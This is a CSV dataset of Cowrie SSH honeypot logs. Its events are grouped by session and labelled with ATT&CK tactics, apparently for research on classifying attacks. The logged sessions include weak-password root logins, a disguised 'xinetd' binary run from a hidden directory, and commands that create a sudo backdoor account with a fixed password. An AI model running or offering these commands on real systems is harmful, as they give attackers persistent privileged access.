,event,session_id,session,labels
10,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:59914 (10.42.4.33:2222) [session: 6ddc5979837e]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 59914.0, ""timestamp"": ""2025-08-13T15:42:04.763985Z"", ""session_id"": ""6ddc5979837e""}",6ddc5979837e,chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
11,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T15:42:04.771921Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""6ddc5979837e""}",6ddc5979837e,chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
12,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""98ddc5604ef6a1006a2b49a58759fbe6"", ""hashAlgorithms"": ""curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha1""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T15:42:04.823977Z"", ""session_id"": ""6ddc5979837e""}",6ddc5979837e,chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
13,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/ubuntu] succeeded"", ""password"": ""ubuntu"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T15:42:04.936622Z"", ""username"": ""root"", ""session_id"": ""6ddc5979837e""}",6ddc5979837e,chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
14,"{""eventid"": ""cowrie.session.file_upload"", ""filename"": ""xinetd"", ""message"": ""SFTP Uploaded file \""xinetd\"" to var/lib/cowrie/downloads/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0"", ""outfile"": ""var/lib/cowrie/downloads/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T15:42:48.626447Z"", ""session_id"": ""6ddc5979837e""}",6ddc5979837e,chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
15,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T15:42:48.827424Z"", ""session_id"": ""6ddc5979837e""}",6ddc5979837e,chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
16,"{""eventid"": ""cowrie.command.input"", ""input"": ""chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &"", ""message"": ""CMD: chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T15:42:48.827815Z"", ""session_id"": ""6ddc5979837e""}",6ddc5979837e,chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
17,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/44ccde23a5c949dc5d43b7bc18c7045613458253b1230fe3796d2806774fa629 after 0.0 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""44ccde23a5c949dc5d43b7bc18c7045613458253b1230fe3796d2806774fa629"", ""size"": 138.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T15:42:48.870844Z"", ""ttylog"": ""var/lib/cowrie/tty/44ccde23a5c949dc5d43b7bc18c7045613458253b1230fe3796d2806774fa629"", ""session_id"": ""6ddc5979837e""}",6ddc5979837e,chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
18,"{""duration"": ""44.1"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 44.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-13T15:42:48.871368Z"", ""session_id"": ""6ddc5979837e""}",6ddc5979837e,chmod +x ./.5454576005537444514/xinetd;nohup ./.5454576005537444514/xinetd  &;,"['Execution', 'Initial Access', 'Persistence', 'Command and Control']"
19,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:37577 (10.42.6.15:2222) [session: 8e93772b8334]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 37577.0, ""timestamp"": ""2025-08-11T00:10:24.825754Z"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
20,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:24.827096Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
21,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:24.839264Z"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
22,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:24.915385Z"", ""username"": ""root"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
23,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:25.108704Z"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
24,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:25.109294Z"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
25,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 cAdVqqHW"", ""message"": ""CMD: openssl passwd -1 cAdVqqHW"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:25.109885Z"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
26,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 cAdVqqHW"", ""message"": ""Command not found: openssl passwd -1 cAdVqqHW"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:25.110586Z"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
27,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/c9d50d6b5428ffaff4db45cbb6e8274abd32f793146dfb11d5226d3855fda5cd after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""c9d50d6b5428ffaff4db45cbb6e8274abd32f793146dfb11d5226d3855fda5cd"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:25.123631Z"", ""ttylog"": ""var/lib/cowrie/tty/c9d50d6b5428ffaff4db45cbb6e8274abd32f793146dfb11d5226d3855fda5cd"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
28,"{""duration"": ""0.3"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.3 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T00:10:25.124412Z"", ""session_id"": ""8e93772b8334""}",8e93772b8334,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 cAdVqqHW) system  && sudo usermod -aG sudo system ; openssl passwd -1 cAdVqqHW;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
29,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:53555 (10.42.6.15:2222) [session: 008b17721d32]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 53555.0, ""timestamp"": ""2025-08-14T01:31:36.340124Z"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
30,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T01:31:36.341820Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
31,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-14T01:31:36.354439Z"", ""session_id"": ""008b17721d32""}",008b17721d32,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Ka2mQQks) system  && sudo usermod -aG sudo system ; openssl passwd -1 Ka2mQQks;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
